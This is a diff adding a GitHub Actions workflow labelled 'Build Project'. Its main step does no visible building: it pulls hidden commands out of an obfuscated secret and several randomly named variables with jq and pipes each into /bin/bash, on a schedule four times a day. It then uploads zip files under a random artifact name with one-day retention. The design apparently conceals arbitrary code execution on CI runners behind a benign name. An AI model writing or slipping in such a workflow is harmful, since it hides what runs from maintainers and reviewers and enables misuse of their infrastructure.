@@ -1,0 +1,41 @@
+name: Build Project
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '14 1,7,13,19 * * *'
+permissions:
+  contents: read
+  actions: read
+env:
+  CI: true
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  automation:
+    name: Main task
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Process
+        env:
+          d807: ${{ secrets.d807 }}
+        run: |
+          printf '%s' "$d807" | jq -r .pjtpd7215 | /bin/bash
+          echo $y63 | jq -r .umc1025 | /bin/bash
+          printf '%s' "$ofnwn4" | jq -r .owy45245 | /bin/bash
+          echo $fysaj284 | jq -r .yd6554 | /bin/bash
+          echo $w22069 | jq -r .l013 | /bin/bash
+
+      - name: Store results
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: x47DemYq
+          path: "*.zip"
+          retention-days: 1
